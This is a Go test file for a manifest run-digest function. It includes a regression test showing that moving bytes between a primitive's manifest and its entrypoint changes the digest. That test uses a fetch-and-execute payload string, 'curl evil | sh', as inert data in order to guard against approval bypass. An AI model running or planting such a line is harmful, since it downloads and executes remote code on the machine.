package manifest

import (
	"os"
	"path/filepath"
	"testing"
)

// A fixed vector: the digest is sha256("tap-run-digest-v2\n" || len8(yaml) || yaml || len8(program) || program), so a
// change to the rule changes this value and every caller sees it at once.
func TestRunDigestVector(t *testing.T) {
	dir := t.TempDir()
	yaml := "apiVersion: primitives.telara.dev/v3\nkind: Primitive\nmetadata: {publisher: dev.test, name: v, version: 1.0.0}\nexecution: {entrypoint: main.sh}\n"
	os.WriteFile(filepath.Join(dir, "primitive.yaml"), []byte(yaml), 0o644)
	os.WriteFile(filepath.Join(dir, "main.sh"), []byte("echo ok\n"), 0o644)
	got, m, err := RunDigest(dir)
	if err != nil || m.Metadata.Name != "v" {
		t.Fatal(err)
	}
	// derived independently with python hashlib and struct.pack('>Q', len)
	if want := "5715266e9da6b90125e2791c63aeecbc4367920fc15d6db020ab360cbd23a132"; got != want {
		t.Fatalf("digest %s, want %s", got, want)
	}
	os.WriteFile(filepath.Join(dir, "main.sh"), []byte("echo changed\n"), 0o644)
	if again, _, _ := RunDigest(dir); again == got {
		t.Fatal("a changed program kept its digest")
	}
	if _, _, err := RunDigest(t.TempDir()); err == nil {
		t.Fatal("a folder with no manifest has a digest")
	}
}

// Bytes moved between primitive.yaml and the entrypoint must change the
// digest. With a bare concatenation, a manifest ending in a comment that holds
// program text P digested the same as a manifest without it and an entrypoint
// that starts with P, so approving the first admitted the second (TAP-G03).
func TestRunDigestChangesWhenBytesMoveBetweenManifestAndEntrypoint(t *testing.T) {
	head := "apiVersion: primitives.telara.dev/v3\nkind: Primitive\nmetadata: {publisher: dev.test, name: v, version: 1.0.0}\nexecution: {entrypoint: main.sh}\n"
	payload := "curl evil | sh\n"
	build := func(yaml, script string) string {
		dir := t.TempDir()
		os.WriteFile(filepath.Join(dir, "primitive.yaml"), []byte(yaml), 0o644)
		os.WriteFile(filepath.Join(dir, "main.sh"), []byte(script), 0o644)
		d, _, err := RunDigest(dir)
		if err != nil {
			t.Fatal(err)
		}
		return d
	}
	a := build(head+"#"+payload, "echo ok\n")
	b := build(head+"#", payload+"echo ok\n")
	if a == b {
		t.Fatalf("moving %q from the manifest into the program kept digest %s", payload, a)
	}
}
